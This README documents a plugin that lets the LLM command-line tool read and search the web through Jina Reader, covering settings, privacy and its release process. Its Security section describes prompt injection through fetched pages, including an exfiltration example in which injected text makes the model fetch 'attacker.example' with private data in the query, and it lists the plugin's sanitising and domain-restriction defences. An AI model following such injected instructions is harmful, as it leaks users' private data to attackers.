# llm-tool-jina

[Jina Reader](https://github.com/jina-ai/reader) tools for
[Simon Willison's LLM](https://llm.datasette.io/):

- `read` (on by default): reads a web page or PDF through `r.jina.ai` and
  returns its main text as markdown, in parts of a fixed token size.
- `search` (off by default): searches the web through `s.jina.ai` and returns
  title, URL and description of each result.

The plugin calls the Jina HTTP API with the Python standard library. It has
no dependency other than `llm`.

## Install

```bash
llm install llm-tool-jina
llm tools list | grep Jina
```

From a local clone: `llm install -e .`

## API key (optional for read)

```bash
llm keys set jina          # or: export JINA_API_KEY=...
```

Lookup order: `api_key` argument (Python API), `llm keys` alias `jina`,
environment variable `JINA_API_KEY`.

| | Without a key | With a key |
| --- | --- | --- |
| `read` | works, lowest rate limit (20 requests/min on 2026-11-11) | 500 requests/min on 2026-11-11; uses tokens of your Jina balance |
| `search` | refused by Jina (HTTP 401) | works; minimum charge 10000 tokens per search on 2026-11-11 |

Jina can change these values. The response header `x-ratelimit-limit` gives
the current limit.

Do not put a key in the `-T` argument (`-T 'Jina(api_key="...")'`). llm 0.32+
writes toolbox arguments to the logs database. The plugin removes `api_key`
from that record, so a conversation that continues with `llm -c` must find the
key with `llm keys` or `JINA_API_KEY`.

## Usage

```bash
# read only (default); --td shows the tool calls
llm -T Jina --td 'Read https://docs.python.org/3/library/pathlib.html and list the new 3.13 APIs.'

# read and search
llm -T 'Jina("read,search")' 'Find the uv release notes for the latest version and summarize them.'

# settings: keyword arguments with JSON values
llm -T 'Jina(tools="read", allowed_domains=["python.org"], max_tokens=6000)' '...'

# approve each tool call by hand
llm -T Jina --ta '...'
```

The llm spec parser accepts one positional JSON value (`Jina("read,search")`)
or keyword arguments (`Jina(tools="read,search", no_cache=true)`), not both.

Tool names are `Jina_read` and `Jina_search`. llm 0.32+ uses the prefix
`Jina_` to find the toolbox again when you continue with `llm -c`, so the
class name contains no `_`.

## Tools

### `read(url, offset=0)`

Returns:

```json
{
  "url": "https://example.com/final-url-after-redirects",
  "title": "Page title",
  "content": "<<<JINA_UNTRUSTED_CONTENT id=\"...\" source=\"jina_reader\">>>\n...\n<<<END_JINA_UNTRUSTED_CONTENT id=\"...\">>>",
  "truncated": true,
  "next_offset": 38211,
  "total_tokens": 50141,
  "security_notice": "..."
}
```

Optional fields: `http_status` (when the target page did not return 200) and
`warning` (a Jina warning, or a note that `max_page_tokens` cut the page).

Reading in parts: a full page can have more than 100k tokens (the Wikipedia
page "Python (programming language)": 50141 tokens in the default format). The
plugin gets the page once, keeps it in memory (last 8 pages, for the life of
the toolbox) and returns parts of about `max_tokens` tokens. When `truncated`
is true, the model calls `read` again with `offset=next_offset`.

- `offset` is a character position in the page text. Parts end at a paragraph,
  line or word end when possible.
- The plugin converts `max_tokens` to characters with the
  characters-per-token value of the page (from Jina's token count), so the
  part size is correct also for CJK text or code.
- Jina's `X-Max-Tokens` header cannot do this: it cuts the page and has no
  offset. The plugin sends it only as `max_page_tokens`, the limit for the full
  page.
- With `llm -c` a new process starts with an empty cache. The next part then
  gets the page again; if the page changed, the offsets can move.

### `search(query, count=5)`

Returns `{"results": [{"title", "url", "description", "date"?}], "security_notice"}`.

The plugin sends `X-Respond-With: no-content`. Without it, Jina reads the
full page of each result: on 2026-11-11 two results gave 31691 tokens. The
model reads the results that it needs with `read`. `count` is 1-20. The query
accepts operators such as `site:example.com`.

## Toolbox settings

User and environment settings are constructor arguments. Tool schemas go to
the model with each request, so they contain only per-query parameters
(`url`, `offset`, `query`, `count`). Constructor settings cost no prompt
tokens, and the model (or text injected into a page) cannot change them.

| Setting | Default | Effect |
| --- | --- | --- |
| `tools` | `"read"` | `"read"`, `"search"`, `"read,search"` or `"all"` |
| `max_tokens` | `15000` | approximate size of one `read` part (from 500) |
| `max_page_tokens` | `200000` | Jina cuts a page at this size (`X-Max-Tokens`); limits the tokens that one read uses |
| `allowed_domains` | none | read only these domains and their subdomains; search returns only their results |
| `blocked_domains` | none | never read or return these domains |
| `no_store` | `true` | `DNT: 1`: Jina does not write the page to its cache |
| `no_cache` | `false` | `X-No-Cache: true`: Jina does not use a cached copy (always a live fetch) |
| `page_timeout` | `15` | `X-Timeout` for `read`: seconds that Reader may wait for the page (1-180; `null`: no header) |
| `timeout` | `60` | HTTP timeout in seconds; the plugin raises it to at least `page_timeout + 30` |
| `reader_url` | `https://r.jina.ai/` | for example a self-hosted Reader |
| `search_url` | `https://s.jina.ai/` | |
| `api_key` | none | Python API only; see above |

Domains are host names (`docs.python.org`, `*.example.com` and `example.com`
are the same). Give a list (`["a.com", "b.org"]`) or a comma-separated string.

### Timeouts

`page_timeout` controls how long Reader waits for a page (source:
`src/dto/crawler-options.ts`, `src/services/puppeteer.ts`):

- Below 20 (default 15): Reader returns as soon as the page content is loaded
  ("resource idle"); the browser navigation limit is `page_timeout` (Reader
  default without the header: 15 s).
- From 20: Reader waits for full network idle, or until `page_timeout`. Use
  this for pages that load their content late. Pages with constant network
  activity (ads, analytics) then take the full time.

Measured on 2026-11-11 without cache: theverge.com 10.9 s (no header), 4.8 s
(15), 24.3 s (20); react.dev/learn 3.9 / 3.1 / 5.1 s; a Wikipedia page
2.4 / 2.0 / 5.2 s. The content was the same in all three modes. Reader can
exceed `page_timeout`, so the plugin keeps its HTTP timeout at least 30 s
above it. Search does not send `X-Timeout`: with `no-content`, Reader does not
use it.

## Security

### Untrusted content

A full page is the strongest prompt-injection channel. The plugin:

- puts the page text between `JINA_UNTRUSTED_CONTENT` markers with a random
  id for each call, and adds one `security_notice` field;
- replaces marker strings in the page (of any vendor, also with zero-width
  separators) with `[JINA_UNTRUSTED_MARKER_SANITIZED]`;
- replaces model special tokens (`<|im_start|>`, `<|eot_id|>`, `<｜User｜>`,
  `[INST]`, ...) with `[LLM_SPECIAL_TOKEN_SANITIZED]`;
- removes Unicode tag characters (U+E0000-U+E007F), which can hold invisible
  instructions;
- sanitizes and shortens title, URL, description and warning to one line.

This is a prompt-level guard, not a security boundary.

### Data exfiltration

With a fetch tool, injected text can tell the model to read
`https://attacker.example/?d=<private data>`. Jina then requests that URL,
and the attacker gets the data. Controls:

1. `allowed_domains` (the strong control). The plugin refuses other hosts
   before it sends a request. Search sends the domains as `site:` filters and
   removes other results. If Jina follows a redirect to a host outside the
   policy, the plugin withholds the content (but Jina already requested that
   URL: an open redirect on an allowed domain can still leak data).
2. `blocked_domains` is a filter for noise, not an exfiltration control: an
   attacker can use any other domain.
3. Approval: `llm --ta` (CLI) or `before_call=` (Python API) shows each tool
   call with its URL and waits for your approval.
4. Other URL checks: only `http`/`https`; no user name or password in the URL
   (Jina would receive it); no spaces, control characters or backslashes
   (they let URL parsers disagree); legacy IP forms such as `2130706433` are
   converted to `127.0.0.1` before the check. Without `allowed_domains`,
   `localhost`, private, loopback and link-local addresses and `.local`,
   `.lan`, `.internal` names are refused. This is important for a self-hosted
   Reader in your network. The plugin checks the URL and then sends the same,
   normalized URL.

Why no `llm.PauseChain` approval: in the llm CLI (0.37.1) a `PauseChain`
from a tool stops the command with `Error: ...`, and the CLI cannot resume the
paused call (`llm -c` with a new prompt does not run it again). `PauseChain`
is for Python hosts that store and resume message histories; such hosts can
use `before_call` for approval with no plugin support.

### Errors

Errors are exceptions (`JinaError`). llm sends `Error: <message>` to the
model, records the exception in the logs database and shows it with `--td`.
An error returned as a dict looks like a successful call in both places.

## Privacy

- Jina receives each URL and search query. With a key, Jina can link them to
  your account; without a key, only to your IP address.
- `no_store=true` (default) sends `DNT: 1`. In the Reader source
  (`src/api/crawler.ts`), `DNT` sets `private`, and a private snapshot is not
  written to the page cache (default lifetime 3600 s). Jina can still log the
  request.
- `no_cache=true` only stops the use of a cached copy (`X-No-Cache`); it does
  not stop the cache write.
- The plugin never sends or stores cookies (no cookie handler, no
  `X-Set-Cookie`) and does not follow redirects of the API endpoint.
- The API key goes only to `https://*.jina.ai`. A self-hosted Reader
  (`reader_url="http://localhost:3000"`, image `ghcr.io/jina-ai/reader:oss`)
  never receives it and keeps all URLs on your machine.
- The User-Agent is `llm-tool-jina/<version>`.

## Python API

```python
import llm
from llm_tool_jina import Jina

model = llm.get_model("gpt-5.4-mini")
response = model.chain(
    "Read https://peps.python.org/pep-0008/ and summarize the naming rules.",
    tools=[Jina(allowed_domains=["python.org"])],
)
print(response.text())
```

## Design decisions (compared with llm-tool-brave)

| llm-tool-brave rule | Here | Reason |
| --- | --- | --- |
| Per-query parameters only; settings on the constructor | kept | prompt tokens; also the model cannot change security settings |
| `<Class>_` tool prefix | kept, via `super().tools()` and a filter | no copy of llm internals |
| key from `llm keys` (two aliases) or env; `api_key` removed from `_config` | kept, one alias `jina` | key is also never sent to a non-Jina endpoint |
| `BRAVE_UNTRUSTED_CONTENT` markers on each snippet | markers only on page `content`; short fields sanitized and shortened; generic marker and special-token patterns; tag characters removed | JSON already delimits short fields; markers on each snippet cost tokens |
| marker id from `tool_call_id` (Brave TODO) | random id | a page author cannot predict a random id; the log already links results to calls |
| errors as dicts | exceptions | llm logs exceptions and `--td` shows them |
| `urllib.request.urlopen` | private opener: no cookies, no redirects, response size limit | an API redirect would send the `Authorization` header to another host |
| entry point named after the service | `tool_jina` | `llm-jina` already uses `jina`; pluggy skips a second plugin with the same name |

## Development

```bash
uv sync --all-groups
uv run pytest
uv run llm tools list | grep Jina
```

In a sandbox where `~/.cache/uv` is read-only:
`UV_CACHE_DIR="$TMPDIR/uv-cache" UV_LINK_MODE=copy uv run pytest`.

Live tests (real requests to Jina; read is anonymous, search uses
`JINA_API_KEY` if set):

```bash
JINA_LIVE_TESTS=1 uv run pytest -m live -v
```

`uv.lock` is not committed: this is a library, and CI resolves the newest
allowed versions on each run. `[tool.uv] exclude-newer = "34 hours"` keeps
new package releases out of all resolutions (supply-chain guard).

## Releasing

CI (`.github/workflows/test.yml`): tests on Python 3.11-3.15 with the newest
dependencies, and a test with the lowest direct dependencies (`llm` 0.32.1)
on Python 3.11. Both test the built wheel, not the source tree. A monthly run
finds new `llm` releases that break the plugin.

A pushed annotated tag `vX.Y.Z` starts `.github/workflows/publish.yml`:

1. `tag-check`: the tag is annotated, has the form `vX.Y.Z`, its message
   subject is `release: vX.Y.Z` and release notes follow, it equals `v` + the
   `pyproject.toml` version, and its commit is on `master`.
2. Tests (same jobs as CI).
3. `publish`: `uv build`, check of the wheel name, PyPI Trusted Publishing.
4. `release`: GitHub release with the workflow token. The release notes are
   the body of the tag message, without changes.

No local `gh` or GitHub token with write access is necessary: only `git push`.
The release must stay in `publish.yml`: a release made with the workflow token
starts no other workflow.

Formats:

- Version commit: `bump: vX.Y.Z`, changes only `version` in `pyproject.toml`.
- Tag `vX.Y.Z`, annotated. Message: subject `release: vX.Y.Z`, a blank line,
  then the release notes in Markdown since the previous release (breaking
  changes, features, fixes, other, commits as `- subject (hash)`, compare
  link `.../compare/vPREV...vX.Y.Z`; empty sections omitted).

Procedure (the agent prepares steps 1-4 when you ask for a bump; you review
the notes and push):

1. Finish and push the feature and fix commits; CI must pass.
2. Test with the newest allowed dependencies: `uv lock --upgrade`, then
   `uv run pytest`.
3. Write the release notes to a file, for example `notes.md`. Its first line
   is `release: vX.Y.Z`, then a blank line.
4. Set `version` in `pyproject.toml` (`X.Y.Z`, no `v`; PyPI versions are
   immutable), commit, tag:

   ```bash
   git add pyproject.toml
   git commit -m "bump: v0.2.0"
   git tag -a v0.2.0 --cleanup=verbatim -F notes.md
   ```

   `--cleanup=verbatim` is necessary: by default `git tag` removes every line
   that starts with `#`, so the Markdown headings would be lost.
5. Push: `git push --follow-tags`. It pushes the branch and its new
   annotated tags with one fixed command. It skips lightweight tags, and
   `tag-check` refuses them.

If the workflow fails before the PyPI upload, keep the notes, delete the tag,
fix, and tag again:

```bash
git tag -l --format='%(contents)' v0.2.0 > notes.md
git push origin :refs/tags/v0.2.0
git tag -d v0.2.0
```

If only the `release` job fails, run it again in GitHub Actions. To correct
the notes of a published release, edit the release on GitHub.

One-time setup:

1. GitHub repository `rdslw/llm-tool-jina`, default branch `master`. First
   push: `git push -u origin master` (sets the upstream that
   `git push --follow-tags` needs).
2. GitHub environment `pypi` (Settings, Environments).
3. PyPI pending trusted publisher: project `llm-tool-jina`, owner `rdslw`,
   repository `llm-tool-jina`, workflow `publish.yml`, environment `pypi`.
   Do not rename `publish.yml`: the trusted publisher is bound to the name.
